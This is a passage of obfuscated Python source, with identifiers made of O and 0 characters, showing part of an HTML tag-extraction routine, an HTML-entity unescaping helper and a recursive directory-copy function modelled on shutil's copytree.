                    OO0O00OOOO0OOO000 =OOO00OOOO0OO0OOOO [O00OOO00O0OOOOOO0 +len (O0OO00OOOO00O00O0 ):OO000OO0O0OOO00O0 ]#line:3936
                elif OO000OO0O0OOO00O0 >-1 :#line:3937
                    OO0O00OOOO0OOO000 =OOO00OOOO0OO0OOOO [:OO000OO0O0OOO00O0 ]#line:3938
                elif O00OOO00O0OOOOOO0 >-1 :#line:3939
                    OO0O00OOOO0OOO000 =OOO00OOOO0OO0OOOO [O00OOO00O0OOOOOO0 +len (O0OO00OOOO00O00O0 ):]#line:3940
                if ret :#line:3942
                    OOOO000O00OOO00OO =OOO00OOOO0OO0OOOO [OO000OO0O0OOO00O0 :OOO00OOOO0OO0OOOO .find (">",OOO00OOOO0OO0OOOO .find (OOOO000O00OOO00OO ))+1 ]#line:3943
                    OO0O00OOOO0OOO000 =O0OO00OOOO00O00O0 +OO0O00OOOO0OOO000 +OOOO000O00OOO00OO #line:3944
                OOO00OOOO0OO0OOOO =OOO00OOOO0OO0OOOO [OOO00OOOO0OO0OOOO .find (OO0O00OOOO0OOO000 ,OOO00OOOO0OO0OOOO .find (O0OO00OOOO00O00O0 ))+len (OO0O00OOOO0OOO000 ):]#line:3946
                O00000O00000O00OO .append (OO0O00OOOO0OOO000 )#line:3947
            O0OOOOOO0O00O0000 =O00000O00000O00OO #line:3948
        O00000OOO0OO0O000 +=O0OOOOOO0O00O0000 #line:3949
    return O00000OOO0OO0O000 #line:3951
def replaceHTMLCodes (O0O000OO0O0O0OO0O ):#line:3954
    O0O000OO0O0O0OO0O =re .sub ("(&#[0-9]+)([^;^0-9]+)","\\1;\\2",O0O000OO0O0O0OO0O )#line:3955
    O0O000OO0O0O0OO0O =HTMLParser .HTMLParser ().unescape (O0O000OO0O0O0OO0O )#line:3956
    O0O000OO0O0O0OO0O =O0O000OO0O0O0OO0O .replace ("&quot;","\"")#line:3957
    O0O000OO0O0O0OO0O =O0O000OO0O0O0OO0O .replace ("&amp;","&")#line:3958
    return O0O000OO0O0O0OO0O #line:3959
import os #line:3961
from shutil import *#line:3962
def copytree (O0OO0O00000OOO0O0 ,OOO00OO00O0O00OOO ,symlinks =False ,ignore =None ):#line:3963
    O00OOO0O0000000OO =os .listdir (O0OO0O00000OOO0O0 )#line:3964
    if ignore is not None :#line:3965
        OO0O000000OOO0OO0 =ignore (O0OO0O00000OOO0O0 ,O00OOO0O0000000OO )#line:3966
    else :#line:3967
        OO0O000000OOO0OO0 =set ()#line:3968
    if not os .path .isdir (OOO00OO00O0O00OOO ):#line:3969
        os .makedirs (OOO00OO00O0O00OOO )#line:3970
    O0O0OOOO000OO00O0 =[]#line:3971
    for OO000O0O0O0000O00 in O00OOO0O0000000OO :#line:3972
        if OO000O0O0O0000O00 in OO0O000000OOO0OO0 :#line:3973
            continue #line:3974
        OO0OOOOO00O0000O0 =os .path .join (O0OO0O00000OOO0O0 ,OO000O0O0O0000O00 )#line:3975
        OO0OOO0O00O000O00 =os .path .join (OOO00OO00O0O00OOO ,OO000O0O0O0000O00 )#line:3976
        try :#line:3977
            if symlinks and os .path .islink (OO0OOOOO00O0000O0 ):#line:3978
                OO0000O00000OOOOO =os .readlink (OO0OOOOO00O0000O0 )#line:3979
                os .symlink (OO0000O00000OOOOO ,OO0OOO0O00O000O00 )#line:3980
            elif os .path .isdir (OO0OOOOO00O0000O0 ):#line:3981
                copytree (OO0OOOOO00O0000O0 ,OO0OOO0O00O000O00 ,symlinks ,ignore )#line:3982
            else :#line:3983
                copy2 (OO0OOOOO00O0000O0 ,OO0OOO0O00O000O00 )#line:3984
        except Error as O000OO0O0O0OO000O :#line:3985
            O0O0OOOO000OO00O0 .extend (O000OO0O0O0OO000O .args [0 ])#line:3986
        except EnvironmentError as O000OOO0OO0OOO0O0 :#line:3987
            O0O0OOOO000OO00O0 .append ((OO0OOOOO00O0000O0 ,OO0OOO0O00O000O00 ,str (O000OOO0OO0OOO0O0 )))#line:3988
    try :#line:3989
        copystat (O0OO0O00000OOO0O0 ,OOO00OO00O0O00OOO )#line:3990
    except OSError as O000OOO0OO0OOO0O0 :#line:3991
        O0O0OOOO000OO00O0 .extend ((O0OO0O00000OOO0O0 ,OOO00OO00O0O00OOO ,str (O000OOO0OO0OOO0O0 )))#line:3992
